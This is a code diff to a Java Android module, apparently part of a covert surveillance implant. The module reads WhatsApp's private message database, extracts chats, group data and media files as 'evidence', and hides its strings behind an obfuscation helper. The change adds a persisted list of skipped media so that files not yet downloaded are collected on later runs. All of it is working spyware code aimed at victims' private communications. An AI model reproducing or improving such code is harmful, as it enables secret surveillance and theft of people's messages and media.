@@ -9,6 +9,7 @@ import java.io.ObjectStreamClass;
 import java.util.ArrayList;
 import java.util.Date;
 import java.util.Formatter;
+import java.util.HashMap;
 import java.util.concurrent.Semaphore;
 
 import javax.xml.parsers.DocumentBuilderFactory;
@@ -26,11 +27,13 @@ import com.android.dvci.RunningProcesses;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.db.GenericSqliteHelper;
 import com.android.dvci.db.RecordVisitor;
+import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.Path;
 import com.android.dvci.module.MessageChatMultimedia;
 import com.android.dvci.module.ModuleAddressBook;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.StringUtils;
+import com.android.dvci.util.Utils;
 import com.android.mm.M;
 import com.whatsapp.MediaData;
 
@@ -43,7 +46,7 @@ public class ChatWhatsapp extends SubModuleChat {
 
 	private static final String DEFAULT_LOCAL_NUMBER = "local";
 	String pObserving = M.e("com.whatsapp");
-
+	private Markup skippedMultimedia_markup =null;
 	private String myPhoneNumber = DEFAULT_LOCAL_NUMBER;
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
@@ -81,6 +84,9 @@ public class ChatWhatsapp extends SubModuleChat {
 	protected void start() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (actualStart)");
+		}
+		if( skippedMultimedia_markup == null) {
+			 skippedMultimedia_markup = new Markup(module, M.e("skippedMultimedia"));
 		}
 
 		try {
@@ -187,7 +193,7 @@ public class ChatWhatsapp extends SubModuleChat {
 		try {
 
 			long lastWhatsapp = markup.unserialize(new Long(0));
-
+			HashMap<String, Long> skippedMultimedia = skippedMultimedia_markup.unserialize(new HashMap<String, Long>());
 			boolean updateMarkup = false;
 
 			// f.0=/data/data/com.whatsapp/databases
@@ -207,6 +213,28 @@ public class ChatWhatsapp extends SubModuleChat {
 					}
 					return;
 				}
+
+				if(!skippedMultimedia.isEmpty()) {
+					for (Long l : skippedMultimedia.values()) {
+					try {
+						// try to get skipped multimedia if any
+
+							ArrayList<String> changedConversations = fetchConversation(helper, l.longValue());
+							for (String conversation : changedConversations) {
+								if (groups.isGroup(conversation) && !groups.hasMemoizedGroup(conversation)) {
+									fetchGroup(helper, conversation);
+								}
+								fetchSkippedMultimedia(helper, conversation, skippedMultimedia);
+							}
+
+					} catch (Exception e) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (readChatWhatsappMessages): fetchskippedMultimedia " + e);
+						}
+					}
+					}
+				}
+
 				try {
 					// retrieve a list of all the conversation changed from the last
 					// reading. Each conversation contains the peer and the last id
@@ -224,7 +252,7 @@ public class ChatWhatsapp extends SubModuleChat {
 								fetchGroup(helper, conversation);
 							}
 
-							long conversationLastRead = fetchMessages(helper, conversation, lastWhatsapp);
+							long conversationLastRead = fetchMessages(helper, conversation, lastWhatsapp, skippedMultimedia);
 							newLastRead = Math.max(conversationLastRead, newLastRead);
 
 							if (Cfg.DEBUG) {
@@ -246,6 +274,7 @@ public class ChatWhatsapp extends SubModuleChat {
 					}
 				}finally {
 					helper.disposeDb();
+					skippedMultimedia_markup.writeMarkupSerializable(skippedMultimedia);
 				}
 			} else {
 				if (Cfg.DEBUG) {
@@ -348,10 +377,14 @@ public class ChatWhatsapp extends SubModuleChat {
 		long lastRead =0;
 		String peer = "";
 		private ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
+		private HashMap<String,Long> skippedMultimedia=null;
 		private ArrayList<MessageChatMultimedia> multimedias = new ArrayList<MessageChatMultimedia>();
-		private FetchMessagesRecordVisitor(String peer,long lr,String[] projection, String selection, String order) {
+
+
+		private FetchMessagesRecordVisitor(String peer,long lr,String[] projection, String selection, String order,HashMap<String, Long> skM) {
 			super(projection, selection, order);
 			lastRead = lr;
+			skippedMultimedia = skM;
 			this.peer = peer;
 		}
 
@@ -443,19 +476,42 @@ public class ChatWhatsapp extends SubModuleChat {
 			if (to != null && from != null && message != null) {
 				messages.add(new MessageChat(PROGRAM, new Date(timestamp), from, to, message, incoming));
 			} else if (is_mm && to != null && from != null && mm_serialize_obj != null) {
+
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (fetchMessages) multimedia");
+					Check.log(TAG + " (fetchMessages) multimedia day=" +Utils.getDaysBetween(timestamp,new Date().getTime()) + " old");
 				}
 				try{
 					MediaData wamd = byteToWhatsappMediaData(mm_serialize_obj);
-					if (wamd != null && wamd.getFile()!=null && wamd.getFile().canRead() ) {
+					if (wamd != null && wamd.isTransferred() && wamd.getFile()!=null && wamd.getFile().canRead() ) {
 						multimedias.add(new MessageChatMultimedia(PROGRAM, new Date(timestamp), from, to, incoming, mm_media_caption, mm_mime, wamd.getFile(),mm_size));
+						if(skippedMultimedia.containsKey(timestamp.toString())) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (fetchMessages) removing malformed multimedia from the list " + wamd);
+							}
+							skippedMultimedia.remove(timestamp.toString());
+						}
 						if(mm_media_caption!=null){
 							messages.add(new MessageChat(PROGRAM, new Date(timestamp), from, to, mm_media_caption, incoming));
 						}
 					}else{
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " (fetchMessages) skipping malformed multimedia");
+						if(!skippedMultimedia.containsKey(timestamp.toString())) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (fetchMessages) added malformed multimedia to the list " + wamd);
+							}
+							skippedMultimedia.put(timestamp.toString(), timestamp);
+						}else{
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (fetchMessages) skipping malformed multimedia already in the list" + wamd);
+							}
+						}
+						if (wamd != null && wamd.getFile()==null) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (fetchMessages) getFile == NULL is Transferred =" + wamd.isTransferred());
+							}
+						}else if (wamd != null && wamd.getFile()!=null) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (fetchMessages) file="+ wamd.getFile().getAbsolutePath()+"can read ="+  wamd.getFile().canRead());
+							}
 						}
 					}
 				}catch (Exception e){
@@ -492,24 +548,57 @@ public class ChatWhatsapp extends SubModuleChat {
 	 * @param conversation
 	 * @return
 	 */
-	private long fetchMessages(GenericSqliteHelper helper , String conversation, long lastWhatsapp) {
+	private long fetchMessages(GenericSqliteHelper helper , String conversation, long lastWhatsapp,HashMap<String, Long> notRemoved) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (fetchMessages): " + conversation + " : lsw" + lastWhatsapp);
 		}
 		String peer = clean(conversation);
-		String selection = M.e(" key_remote_jid = '") + conversation + M.e("' AND timestamp > ")+lastWhatsapp ;
+		String selection = M.e(" key_remote_jid = '") + conversation + M.e("' AND received_timestamp > ")+lastWhatsapp ;
 
 		String[] projection = { M.e("_id"), M.e("key_remote_jid"), M.e("data"), M.e("timestamp"), M.e("key_from_me"),M.e("remote_resource"),
-				M.e("media_mime_type"), M.e("media_wa_type"), M.e("media_caption"),M.e("thumb_image"), M.e("raw_data"),M.e("media_size")
+				M.e("media_mime_type"), M.e("media_wa_type"), M.e("media_caption"),M.e("thumb_image"), M.e("raw_data"),M.e("media_size"), M.e("received_timestamp")
 		};
 		long lastRead = lastWhatsapp;
-		FetchMessagesRecordVisitor fmsrv = new FetchMessagesRecordVisitor(peer,lastRead,projection,selection,M.e("timestamp"));
+		FetchMessagesRecordVisitor fmsrv = new FetchMessagesRecordVisitor(peer,lastRead,projection,selection,M.e("received_timestamp"),notRemoved);
 		lastRead = helper.traverseRecords(M.e("messages"), fmsrv);
 		getModule().saveEvidence(fmsrv.getMessages());
 		getModule().saveEvidenceMultimedia(fmsrv.getMultimedias());
+		notRemoved = fmsrv.skippedMultimedia;
 		fmsrv = null;
 		System.gc();
 		return lastRead;
+	}
+	/**
+	 * Fetch skipped multimedia if any, that is due to multimedia received but not downloades
+	 *
+	 * @param helper
+	 * @param conversation
+	 * @return
+	 */
+	private void fetchSkippedMultimedia(GenericSqliteHelper helper, String conversation,HashMap<String, Long> missedWhatsapp) {
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (fetchSkippedMultimedia): " + conversation + " : lsw" + missedWhatsapp);
+		}
+		for (Long l : missedWhatsapp.values()) {
+			long lastWhatsapp = l.longValue();
+			String peer = clean(conversation);
+			String selection = M.e(" key_remote_jid = '") + conversation + M.e("' AND received_timestamp = ") + lastWhatsapp;
+
+			String[] projection = {M.e("_id"), M.e("key_remote_jid"), M.e("data"), M.e("timestamp"), M.e("key_from_me"), M.e("remote_resource"),
+					M.e("media_mime_type"), M.e("media_wa_type"), M.e("media_caption"), M.e("thumb_image"), M.e("raw_data"), M.e("media_size"), M.e("timestamp")
+			};
+
+			FetchMessagesRecordVisitor fmsrv = new FetchMessagesRecordVisitor(peer, lastWhatsapp, projection, selection, M.e("received_timestamp"),missedWhatsapp);
+			long lastRead = helper.traverseRecords(M.e("messages"), fmsrv);
+			getModule().saveEvidence(fmsrv.getMessages());
+			getModule().saveEvidenceMultimedia(fmsrv.getMultimedias());
+			missedWhatsapp = fmsrv.skippedMultimedia;
+			fmsrv = null;
+			System.gc();
+		}
+
+
 	}
 
 	private String clean(String remote) {
